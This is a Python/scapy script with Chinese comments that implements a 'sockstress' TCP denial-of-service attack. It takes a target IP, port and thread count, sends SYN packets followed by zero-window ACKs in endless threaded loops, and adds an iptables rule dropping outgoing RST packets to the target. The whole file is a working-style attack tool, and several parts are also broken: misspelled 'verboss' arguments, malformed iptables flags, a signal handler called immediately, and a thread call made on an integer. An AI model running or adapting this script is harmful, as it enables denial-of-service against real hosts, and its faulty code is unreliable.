#-*- coding:utf-8 -*-
from scapy.all import *
from time import sleep
import _thread
import logging
import os
import signal
import sys

from scapy.layers.inet import TCP, IP

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 4:
    print("用法： ./sock_stress.py [目标IP] [端口] [线程数]")
    print("举例： ./scok_stress.py [1.1.1.1] 20 ##攻击端口处于开放状态")
    sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

##攻击函数
def sock_stress(target,dstport):
    while 0 == 0:
        try:
            x = random.randint(0,65535)
            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verboss=0)
            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq+1))/'\x00\x00',verboss=0)
        except:
            pass
##停止攻击函数
def shutdown(signal,frame):
    print("正在恢复 ipables 规则")
    os.system('iptables -D OUTPUT -p tcp --tcp flags RST -d' + target +' -j DROP')
    sys.exit()
##添加iptables规则
os.system('iptables -A OUTPUT -p tcp --tcp -flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT,shutdown())
##多线程攻击
print("\n攻击正在进行...按 Ctrl+C 停止攻击")
for x in range(0,threads):
    threads.start_new_thread(sock_stress(target,dstport))

##永远执行
while 0==0:
    sleep(1)





























